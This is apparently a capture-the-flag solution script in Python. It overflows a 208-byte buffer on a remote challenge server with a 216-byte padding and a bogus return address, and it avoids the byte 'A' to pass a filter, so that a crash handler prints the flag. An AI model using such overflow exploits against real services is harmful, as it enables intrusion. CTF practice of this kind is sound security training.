import socket
import struct
import time

HOST = 'teatime.zerodays.events'
PORT = 4244

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

# Receive prompt
data = b''
while b'input: ' not in data:
    data += s.recv(4096)
print(data.decode())

# Key insight:
# - buffer = 208 bytes (0xd0)
# - strchr(buffer, 'A') check -> can't use 0x41 ('A') in payload!
# - signal(SIGSEGV, crash_win) is set in main
# - crash_win calls flag() which reads flag.txt
# - Just trigger SIGSEGV with overflow (no 'A' bytes needed)
#
# offset = 208 (buffer) + 8 (saved RBP) = 216

offset  = 216
padding = b'B' * offset
bad_rip = struct.pack('<Q', 0xdeadbeefdeadbeef)  # no 0x41 bytes
payload = padding + bad_rip

assert b'\x41' not in payload, "payload contains 'A'!"
print(f"[*] Sending {len(payload)} byte payload...")
s.sendall(payload + b'\n')

time.sleep(2)
response = s.recv(4096)
print(response.decode())
s.close()